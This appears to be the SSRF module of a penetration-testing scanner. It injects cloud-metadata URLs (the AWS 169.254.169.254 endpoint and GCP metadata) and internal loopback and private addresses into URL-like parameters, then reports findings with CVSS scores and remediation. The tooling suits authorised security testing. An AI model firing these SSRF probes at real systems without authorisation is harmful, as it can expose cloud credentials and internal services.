"""SSRF phase -- probe URL-accepting params for server-side request forgery."""
from __future__ import annotations

import re

import httpx

from pentora.context import ScanContext
from pentora.finding import CVSS, Finding
from pentora.modules.base import PhaseModule
from pentora.targets import Candidate, gather_candidates

# CVSS for SSRF to cloud metadata (C:H/I:N/A:N = 7.5 high)
_SSRF_META_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
# CVSS for SSRF to internal services (C:H/I:L/A:N = 8.1 high)
_SSRF_INTERNAL_VECTOR = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N"

# Params that accept URLs / are likely SSRF candidates
_URL_PARAMS = frozenset({
    "url", "callback", "webhook", "image", "redirect", "next",
    "src", "href", "link", "fetch", "proxy", "request", "uri",
    "endpoint", "target", "dest", "destination",
})

# AWS Instance Metadata Service patterns
_AWS_PATTERNS = re.compile(r"ami-id|instance-id|instance-type|hostname", re.I)
# GCP metadata patterns
_GCP_PATTERNS = re.compile(r"computeMetadata|instance/id|project/", re.I)

# Cloud metadata targets for injection
_METADATA_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDSv1
    "http://metadata.google.internal/",           # GCP
]
# Internal port probes
_INTERNAL_TARGETS = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://10.0.0.1",
]


def _has_url_param(cand: Candidate) -> bool:
    return bool(_URL_PARAMS.intersection(cand.params))


def _is_aws_hit(body: str) -> bool:
    return bool(_AWS_PATTERNS.search(body))


def _is_gcp_hit(body: str) -> bool:
    return bool(_GCP_PATTERNS.search(body))


class SsrfModule(PhaseModule):
    name = "ssrf"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        candidates = await gather_candidates(ctx)
        ssrf_candidates = [c for c in candidates if _has_url_param(c)]
        if not ssrf_candidates:
            return []

        findings: list[Finding] = []
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=10.0,
            verify=False,  # noqa: S501 - intentional for testing
        ) as client:
            for cand in ssrf_candidates:
                findings += await self._probe_candidate(client, cand)

        for f in findings:
            if ctx.store:
                await ctx.store.add(f)
        return findings

    async def _probe_candidate(
        self, client: httpx.AsyncClient, cand: Candidate
    ) -> list[Finding]:
        findings: list[Finding] = []
        url_param = next(iter(_URL_PARAMS.intersection(cand.params)), "url")

        # 1. Cloud metadata probes
        for target in _METADATA_TARGETS:
            probe_url = cand.url + f"?{url_param}={target}"
            try:
                resp = await client.get(probe_url)
                body = resp.text
                if _is_aws_hit(body):
                    findings.append(
                        Finding(
                            module="ssrf.aws_metadata",
                            title="SSRF to AWS EC2 instance metadata",
                            endpoint=cand.url,
                            method=cand.method,
                            evidence=(
                                f"Param '{url_param}' fetched {target}:"
                                " found AWS metadata indicators."
                            ),
                            cvss=CVSS.from_vector(_SSRF_META_VECTOR),
                            description=(
                                "Server fetched AWS EC2 metadata; credentials may be exposed."
                            ),
                            remediation=(
                                "Enforce IMDSv2; block SSRF via allow-list of outbound targets."
                            ),
                        )
                    )
                    return findings  # one metadata hit is enough evidence
                if _is_gcp_hit(body):
                    findings.append(
                        Finding(
                            module="ssrf.gcp_metadata",
                            title="SSRF to GCP instance metadata",
                            endpoint=cand.url,
                            method=cand.method,
                            evidence=(
                                f"Param '{url_param}' fetched {target}:"
                                " found GCP metadata indicators."
                            ),
                            cvss=CVSS.from_vector(_SSRF_META_VECTOR),
                            description="Server fetched GCP instance metadata.",
                            remediation=(
                                "Block SSRF via outbound allow-list; enforce metadata headers."
                            ),
                        )
                    )
                    return findings
            except httpx.HTTPError:
                pass

        # 2. Internal port probes -- compare response against baseline
        try:
            baseline = await client.get(cand.url + f"?{url_param}=https://example.com")
            baseline_body = baseline.text
        except httpx.HTTPError:
            baseline_body = ""

        for internal_target in _INTERNAL_TARGETS:
            probe_url = cand.url + f"?{url_param}={internal_target}"
            try:
                resp = await client.get(probe_url)
                body = resp.text
                # Significant difference between baseline and internal → SSRF
                if body != baseline_body and len(body) > 5:
                    findings.append(
                        Finding(
                            module="ssrf.internal_port",
                            title=f"SSRF to internal service ({internal_target})",
                            endpoint=cand.url,
                            method=cand.method,
                            evidence=(
                                f"Param '{url_param}' targeting {internal_target} "
                                f"returned distinct response ({len(body)}B"
                                f" vs baseline {len(baseline_body)}B)."
                            ),
                            cvss=CVSS.from_vector(_SSRF_INTERNAL_VECTOR),
                            description=(
                                "The server made an internal network request"
                                " on behalf of the attacker."
                            ),
                            remediation=(
                                "Validate and restrict URLs; use an outbound proxy allow-list."
                            ),
                        )
                    )
                    break
            except httpx.HTTPError:
                pass

        return findings




